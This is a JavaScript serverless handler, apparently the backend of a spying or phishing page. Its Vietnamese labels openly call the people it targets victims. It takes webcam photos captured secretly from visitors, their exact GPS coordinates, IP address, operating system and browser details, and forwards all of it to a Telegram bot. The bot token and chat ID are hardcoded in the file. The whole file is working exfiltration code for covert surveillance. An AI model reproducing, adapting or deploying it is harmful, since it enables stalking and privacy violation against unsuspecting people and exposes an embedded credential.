export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    const BOT_TOKEN = "8768999948:AAHzR2Avd2VCkiF1soTvB3HOy6QeT8PFvdU"; 
    const CHAT_ID = "7750249320"; 

    try {
        const data = req.body;
        let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
        if (ip.includes(',')) ip = ip.split(',')[0].trim();

        // --- XỬ LÝ GỬI ẢNH WEBCAM ---
        if (data.type === "webcam") {
            // 1. Chuyển Base64 thành Buffer
            const base64Data = data.image.replace(/^data:image\/jpeg;base64,/, "");
            const buffer = Buffer.from(base64Data, 'base64');

            // 2. Chuẩn bị FormData để gửi ảnh cho Telegram
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('caption', `📸 *ẢNH CHỤP LÉN NẠN NHÂN*\nIP: \`${ip}\``);
            formData.append('parse_mode', 'Markdown');
            
            // 3. Đính kèm ảnh
            const blob = new Blob([buffer], { type: 'image/jpeg' });
            formData.append('photo', blob, 'webcam.jpg');

            // 4. Gọi API Telegram
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });

            return res.status(200).json({ success: true });
        }

        // --- XỬ LÝ TEXT (GPS, INFO...) ---
        let message = "";
        if (data.type === "basic_info") {
            message = `📱 *THIẾT BỊ TRUY CẬP*\n\n*IP:* \`${ip}\`\n*Hệ điều hành:* ${data.platform}\n*Trình duyệt:* ${data.userAgent}`;
        } else if (data.type === "gps") {
            message = `📍 *VỊ TRÍ GPS CHÍNH XÁC!*\n\n*IP:* \`${ip}\`\n*Vĩ độ:* ${data.lat}\n*Kinh độ:* ${data.lon}\n\n[🗺 Xem trên Google Maps](https://www.google.com/maps?q=${data.lat},${data.lon})`;
        } else if (data.type === "gps_denied") {
            message = `⚠️ *TỪ CHỐI GPS*\n*IP:* \`${ip}\``;
        }

        // Gửi tin nhắn text
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        return res.status(200).json({ success: true });
    } catch (error) {
        return res.status(500).json({ error: 'Internal Server Error' });
    }
}
